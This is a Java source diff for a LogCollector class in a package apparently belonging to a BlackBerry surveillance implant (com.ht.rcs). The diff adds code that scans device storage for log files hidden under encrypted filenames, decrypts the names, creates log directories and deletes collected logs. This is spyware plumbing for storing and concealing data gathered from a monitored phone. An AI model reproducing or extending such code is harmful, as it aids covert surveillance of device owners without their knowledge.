@@ -22,13 +22,14 @@ import net.rim.device.api.util.NumberUtilities;
 import com.ht.rcs.blackberry.agent.Agent;
 import com.ht.rcs.blackberry.config.Keys;
 import com.ht.rcs.blackberry.crypto.Encryption;
+import com.ht.rcs.blackberry.fs.AutoFlashFile;
 import com.ht.rcs.blackberry.fs.Path;
 import com.ht.rcs.blackberry.interfaces.Singleton;
 import com.ht.rcs.blackberry.utils.Check;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
-public final class LogCollector implements Singleton {
+public class LogCollector implements Singleton {
     private static Debug debug = new Debug("LogCollector", DebugLevel.VERBOSE);
 
     static LogCollector instance = null;
@@ -63,7 +64,7 @@ public final class LogCollector implements Singleton {
         return instance;
     }
 
-    private LogCollector() {
+    protected LogCollector() {
         super();
         logVector = new Vector();
 
@@ -79,8 +80,12 @@ public final class LogCollector implements Singleton {
         // TODO Auto-generated method stub
 
     }
+
+    public static String encryptName(String logMask) {
+        return Encryption.encryptName(logMask, Keys.getChallengeKey()[0]);
+    }
     
-    private String decryptName(String logMask) {
+    public static String decryptName(String logMask) {
         return Encryption.decryptName(logMask, Keys.getChallengeKey()[0]);
     }
 
@@ -94,20 +99,11 @@ public final class LogCollector implements Singleton {
             logProgressivePersistent.setContents(new Integer(1));
         }
 
-        int logProgressiveRet = ((Integer) logProgressivePersistent.getContents())
-                .intValue();
+        int logProgressiveRet = ((Integer) logProgressivePersistent
+                .getContents()).intValue();
         return logProgressiveRet;
     }
 
-    private String encryptName(String logMask) {
-        return Encryption.encryptName(logMask, Keys.getChallengeKey()[0]);
-    }
-
-    public Vector getLogs() {
-        Vector logs = new Vector();
-        
-        return logs;
-    }
 
     protected synchronized int getNewProgressive() {
         logProgressive++;
@@ -186,62 +182,127 @@ public final class LogCollector implements Singleton {
 
     }
 
-    // eventualmente progressivo
+    public Vector getLogs(String basePath) {
+        Vector allLogs = new Vector();
 
-    private boolean scanForLogs(String currentPath) {
+        Vector dirs = scanForDirLogs(basePath);
+        for (int i = 0; i < dirs.size(); i++) {
+            String dir = (String) dirs.elementAt(i);
+            Vector logs = scanForLogs(basePath, dir);
+            allLogs.addElement(logs);
+        }
+
+        return allLogs;
+    }
+
+    /**
+     * Estrae la lista di log nella forma *.MOB dentro la directory specificata
+     * da currentPath, nella forma 1_n
+     * 
+     * @param currentPath
+     * @return
+     */
+    public Vector scanForLogs(String currentPath, String dir) {
         Check.requires(currentPath != null, "null argument");
 
+        Vector vector = new Vector();
+
+        FileConnection fcDir = null;
+        // FileConnection fcFile = null;
+        try {
+            fcDir = (FileConnection) Connector.open(currentPath + dir);
+            Enumeration fileLogs = fcDir.list("*", true);
+
+            while (fileLogs.hasMoreElements()) {
+                String file = (String) fileLogs.nextElement();
+
+                // fcFile = (FileConnection) Connector.open(fcDir.getURL() +
+                // file);
+                // e' un file, vediamo se e' un file nostro
+                String logMask = LogCollector.LOG_EXTENSION;
+                String encLogMask = encryptName(logMask);
+
+                if (file.endsWith(encLogMask)) {
+                    // String encName = fcFile.getName();
+                    debug.trace("enc name: " + file);
+                    String plainName = decryptName(file);
+                    debug.trace("plain name: " + plainName);
+
+                    vector.addElement(file);
+                }
+            }
+
+        } catch (IOException e) {
+            e.printStackTrace();
+
+        } finally {
+            if (fcDir != null) {
+                try {
+                    fcDir.close();
+                } catch (IOException e) {
+                    // TODO Auto-generated catch block
+                    e.printStackTrace();
+                }
+            }
+        }
+        return vector;
+    }
+
+    public Vector scanForDirLogs(String currentPath) {
+        Check.requires(currentPath != null, "null argument");
+
+        Vector vector = new Vector();
         FileConnection fc;
 
         try {
             fc = (FileConnection) Connector.open(currentPath);
 
             if (fc.isDirectory()) {
-                Enumeration fileLogs = fc.list("*", true);
+                Enumeration fileLogs = fc.list(Path.LOG_DIR + "*", true);
 
                 while (fileLogs.hasMoreElements()) {
-                    String file = (String) fileLogs.nextElement();
-                    return scanForLogs(file);
-                }
-            } else {
-                // e' un file, vediamo se e' un file nostro
-                String logMask = LogCollector.LOG_EXTENSION;
-                String encLogMask = encryptName(logMask);
-
-                if (currentPath.endsWith(encLogMask)) {
-                    String encName = fc.getName();
-                    debug.trace("enc name: " + encName);
-                    String plainName = decryptName(encName);
-                    debug.trace("plain name: " + plainName);
+                    String dir = (String) fileLogs.nextElement();
+                    // scanForLogs(dir);
+                    // return scanForLogs(file);
+                    vector.addElement(dir);
 
                 }
             }
 
+            fc.close();
+
         } catch (IOException e) {
             e.printStackTrace();
-            return false;
+
         }
 
-        return true;
+        return vector;
     }
 
     //
     public void scanLogs() {
         clear();
 
+        Path.makeDirs(true);
+        Path.makeDirs(false);
+
         // cerca i log sul filesystem, scandendo tutti i possibili path
         // usando come filtro LOG_DIR_FORMAT
 
-        scanForLogs(Path.SD_PATH);
-        scanForLogs(Path.USER_PATH);
+        // scanForLogs(Path.SD_PATH);
+        // scanForLogs(Path.USER_PATH);
 
         // costruisce le directory secondo storeToMMC
-        Path.makeDirs(true);
-        Path.makeDirs(false);
+
     }
 
     public void remove(String logName) {
-        // TODO Auto-generated method stub
-        
+        debug.info("Removing file: " + logName);
+        AutoFlashFile file = new AutoFlashFile(logName, false);
+        if (file.exists()) {
+            file.delete();
+        } else {
+            debug.warn("File doesn't exists: " + logName);
+        }
     }
 }
